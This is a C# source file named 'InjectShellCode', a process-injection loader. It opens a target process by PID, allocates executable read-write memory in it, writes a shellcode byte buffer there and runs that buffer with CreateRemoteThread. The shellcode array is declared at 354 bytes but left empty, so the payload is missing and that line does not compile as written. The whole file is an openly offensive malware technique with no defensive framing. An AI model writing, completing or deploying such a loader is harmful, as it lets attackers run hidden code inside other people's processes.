using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DWORD = System.UInt32;
namespace InjectShellCode
{
    internal class Program
    {
        [DllImport("Kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            int dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            DWORD dwCreationFlags,
            ref int lpThreadId
            );

        [DllImport("Kernel32.dll")]
        public static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpBuffer,
             int nSize,
             ref int lpNumberOfBytesWritten
            );
        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenProcess(
            DWORD dwDesiredAccess,
            bool bInheritHandle,
            DWORD dwProcessId
            );
        [DllImport("Kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            DWORD flAllocationType,
            DWORD flProtect
            );
        static void Main(string[] args)
        {
            DWORD MEM_COMMIT = 0x00001000;
            DWORD PAGE_EXECUTE_READWRITE = 0x40;
            DWORD MEM_DECOMMIT = 0x00004000;
            DWORD MEM_RESERVE = 0x00002000;
            DWORD PROCESS_VM_OPERATION = 0x0008;
            byte[] buf = new byte[354] {
};
            int ShellCodeSize = buf.Length;
            DWORD DesireAcsses = 0x0008 | 0x0400 | 0x0002 | 0x0010 | 0x0020;

            IntPtr ProcHandel = OpenProcess(DesireAcsses, false, (DWORD)Convert.ToInt32(args[0]));

            IntPtr StartingAddress = VirtualAllocEx(ProcHandel, IntPtr.Zero, ShellCodeSize, MEM_COMMIT|MEM_RESERVE , PAGE_EXECUTE_READWRITE);

            int bitwriitern = 0;
            WriteProcessMemory(ProcHandel, StartingAddress, buf, ShellCodeSize, ref bitwriitern);

            Console.WriteLine($"Byte Written {bitwriitern}");

            int ThreadID = 0;
            IntPtr ThreaPTr =  CreateRemoteThread(ProcHandel, IntPtr.Zero, 0, StartingAddress, IntPtr.Zero, 0, ref ThreadID);
        }
    }
}
